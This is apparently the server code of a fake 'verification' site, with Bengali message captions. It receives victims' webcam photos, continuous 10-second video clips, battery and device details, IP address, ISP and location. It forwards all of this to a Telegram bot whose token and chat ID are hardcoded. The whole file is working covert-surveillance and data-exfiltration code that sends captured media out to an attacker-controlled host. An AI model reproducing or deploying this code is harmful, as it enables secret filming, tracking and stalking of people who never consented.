import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

// Middleware for high-payload JSON and urlencoded for media transmissions
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Helper to construct structured caption with device, battery, charging, IP, and location
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function buildDetailedTelegramCaption(params: {
  header: string;
  verificationId: string;
  alisId?: string;
  cycle?: number;
  time?: string;
  deviceInfo?: any;
  clientIp?: string;
}): string {
  const d = params.deviceInfo || {};
  const effectiveIp =
    d.ip && !d.ip.includes('Resolving')
      ? d.ip
      : params.clientIp || 'Unknown IP';

  const location = d.location && d.location !== 'Unknown' ? d.location : 'Location Resolved';
  const mapsUrl =
    d.mapsUrl ||
    (effectiveIp && !effectiveIp.startsWith('127.') && effectiveIp !== 'Unknown IP'
      ? `https://www.google.com/maps?q=${encodeURIComponent(location !== 'Location Resolved' ? location : effectiveIp)}`
      : '');

  const battery = d.batteryLevel || 'Unknown';
  const charging = d.batteryCharging || 'Unknown';
  const device = d.deviceName || 'Smartphone / Desktop';
  const browser = d.browser || 'Web Browser';
  const platform = d.platform || 'Unknown OS';
  const screen = d.screen || 'Default';
  const isp = d.isp || 'Unknown Network Provider';
  const timeStr = params.time ? new Date(params.time).toLocaleString('en-US') : new Date().toLocaleString('en-US');

  return (
`${params.header}
🆔 সেশন আইডি: ${params.verificationId}
🔗 লিংক রেফারেন্স: ${params.alisId || 'direct'}
⏰ সময়: ${timeStr}

📱 ডিভাইস ও ব্যাটারি তথ্য:
• ডিভাইস নাম: ${device}
• প্ল্যাটফর্ম/OS: ${platform}
• ব্রাউজার: ${browser}
• স্ক্রিন রেজ্যুলেশন: ${screen}
• ব্যাটারি লেভেল: ${battery}
• চার্জিং স্ট্যাটাস: ${charging}

🌐 আইপি ও লাইভ লোকেশন:
• পাবলিক IP: ${effectiveIp}
• এলাকা/লোকেশন: ${location}
• ISP/নেটওয়ার্ক: ${isp}
• গুগল ম্যাপস: ${mapsUrl || 'N/A'}`
  );
}

// Telegram integration status
app.get('/api/telegram-status', (req, res) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
  const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';
  const isConfigured = !!(botToken && chatId);
  res.json({
    configured: isConfigured,
    chatIdConfigured: !!chatId,
  });
});

// Endpoint to receive continuous 10-second security video clips in MP4
app.post('/api/security-feed', async (req, res) => {
  try {
    const { verificationId, alisId, cycle, timestamp, videoBase64, mimeType, deviceInfo } = req.body;

    if (!verificationId) {
      return res.status(400).json({ error: 'verificationId is required' });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
    const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

    const clientIp =
      (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
      req.socket.remoteAddress ||
      '';

    if (botToken && chatId && videoBase64) {
      try {
        const rawBase64 = videoBase64.includes(',') ? videoBase64.split(',')[1] : videoBase64;
        const buffer = Buffer.from(rawBase64, 'base64');
        
        // Ensure MP4 extension and format for Telegram
        const videoBlob = new Blob([buffer], { type: 'video/mp4' });
        const videoFileName = `security_clip_${verificationId}_cycle${cycle || 1}.mp4`;

        const caption = buildDetailedTelegramCaption({
          header: `📹 সিকিউরিটি ফুটেজ [১০ সেকেন্ড ভিডিও #${cycle || 1}] (.mp4)`,
          verificationId,
          alisId,
          cycle: cycle || 1,
          time: timestamp,
          deviceInfo,
          clientIp,
        });

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', videoBlob, videoFileName);
        formData.append('caption', caption);

        // Attempt sendVideo first
        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: formData,
        });

        const tgData = (await tgRes.json()) as { ok: boolean; description?: string };
        
        // If sendVideo fails (e.g. transcode issue), fallback to sendDocument with .mp4
        if (!tgData.ok) {
          console.warn('sendVideo error, falling back to sendDocument:', tgData.description);
          const docFormData = new FormData();
          docFormData.append('chat_id', chatId);
          docFormData.append('document', videoBlob, videoFileName);
          docFormData.append('caption', caption);

          const docRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            body: docFormData,
          });
          const docData = (await docRes.json()) as { ok: boolean; description?: string };

          if (!docData.ok) {
            // Fallback text alert if media rejected
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                text: caption,
              }),
            });
          }
        }
      } catch (tgErr) {
        console.warn('Telegram security feed forward warning:', tgErr);
      }
    }

    res.json({
      success: true,
      cycle: cycle || 1,
      receivedAt: new Date().toISOString(),
    });
  } catch (err) {
    console.error('Failed to process security feed:', err);
    res.status(500).json({ error: 'Internal server error processing security feed' });
  }
});

// Verification notification with instant photo, battery, device, IP, and location
app.post('/api/notify-telegram', async (req, res) => {
  try {
    const { verificationId, time, photoBase64, alisId, deviceInfo } = req.body;

    if (!verificationId) {
      return res.status(400).json({ error: 'verificationId is required' });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
    const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

    if (!botToken || !chatId) {
      return res.json({
        success: true,
        delivered: false,
        note: 'Telegram credentials not configured in environment variables. Skipped sending.',
      });
    }

    const clientIp =
      (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
      req.socket.remoteAddress ||
      '';

    const captionText = buildDetailedTelegramCaption({
      header: '📸 ভেরিফিকেশন রিকোয়েস্ট ও ফটো ক্যাপচার',
      verificationId,
      alisId,
      time,
      deviceInfo,
      clientIp,
    });

    let photoSent = false;
    if (photoBase64) {
      try {
        const rawBase64 = photoBase64.includes(',') ? photoBase64.split(',')[1] : photoBase64;
        const buffer = Buffer.from(rawBase64, 'base64');
        const file = new Blob([buffer], { type: 'image/jpeg' });
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', file, `photo_${verificationId}.jpg`);
        formData.append('caption', captionText);

        const tgPhotoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData,
        });

        const photoJson = (await tgPhotoRes.json()) as { ok: boolean; description?: string };
        if (photoJson.ok) {
          photoSent = true;
        }
      } catch (pErr) {
        console.warn('Telegram photo send error:', pErr);
      }
    }

    // If photo wasn't sent, send rich text message
    if (!photoSent) {
      const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: captionText,
        }),
      });

      const tgResult = (await tgResponse.json()) as { ok: boolean; description?: string };
      if (!tgResult.ok) {
        console.warn('Telegram API response error:', tgResult.description);
        return res.json({ success: false, delivered: false, error: tgResult.description });
      }
    }

    res.json({ success: true, delivered: true });
  } catch (err) {
    console.error('Failed to notify Telegram:', err);
    res.status(500).json({ error: 'Internal server error processing notification' });
  }
});

// Serve static assets from Vite build in production
const distPath = path.resolve(__dirname, 'dist');
app.use(express.static(distPath));

// Fallback to index.html for SPA client-side routing
app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on port ${PORT}`);
});
